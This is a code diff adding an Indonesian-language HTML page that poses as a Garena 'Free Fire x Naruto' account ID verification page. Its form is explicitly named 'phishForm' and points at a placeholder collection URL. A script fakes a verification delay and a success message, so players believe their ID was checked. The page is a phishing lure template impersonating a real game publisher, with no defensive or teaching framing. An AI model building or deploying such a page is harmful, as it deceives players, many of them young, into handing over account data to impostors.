@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi ID Akun - Free Fire x Naruto</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 400px; background: #1a1a1a; border-radius: 10px; overflow: hidden; box-shadow: 0 0 20px rgba(255, 100, 0, 0.5); }
+        .header { background: linear-gradient(135deg, #ff6b00, #ff9500); padding: 15px; text-align: center; }
+        .header h1 { color: #fff; font-size: 18px; text-transform: uppercase; letter-spacing: 1px; }
+        .content { padding: 25px 20px; }
+        .content h2 { color: #fff; font-size: 16px; text-align: center; margin-bottom: 20px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group input { width: 100%; padding: 12px 15px; border: 2px solid #333; border-radius: 5px; background: #0d0d0d; color: #fff; font-size: 14px; outline: none; transition: 0.3s; }
+        .input-group input:focus { border-color: #ff6b00; }
+        .btn { width: 100%; padding: 12px; background: #ff6b00; border: none; border-radius: 5px; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        .btn:hover { background: #ff9500; }
+        .loading { display: none; text-align: center; margin-top: 15px; color: #ff6b00; font-size: 14px; }
+        .footer { background: #0d0d0d; padding: 10px; text-align: center; }
+        .footer p { color: #666; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Verifikasi ID Akun</h1>
+        </div>
+        <div class="content">
+            <h2>Masukkan ID Akun Free Fire Anda</h2>
+            <form id="phishForm" action="https://example.com/save" method="POST">
+                <div class="input-group">
+                    <input type="text" name="ff_id" id="ff_id" placeholder="Masukkan ID Pemain" required>
+                </div>
+                <button type="submit" class="btn">Check</button>
+                <div class="loading" id="loading">Memverifikasi...</div>
+            </form>
+        </div>
+        <div class="footer">
+            <p>&copy; 2026 Garena Free Fire x Naruto Shippuden</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var id = document.getElementById('ff_id').value;
+            if (id.trim() === '') {
+                alert('Masukkan ID Pemain!');
+                return;
+            }
+            document.getElementById('loading').style.display = 'block';
+            this.querySelector('.btn').disabled = true;
+            this.querySelector('.btn').innerText = 'Loading...';
+            
+            setTimeout(function() {
+                alert('ID ' + id + ' berhasil diverifikasi!');
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.btn').disabled = false;
+                document.querySelector('.btn').innerText = 'Check';
+                document.getElementById('phishForm').reset();
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
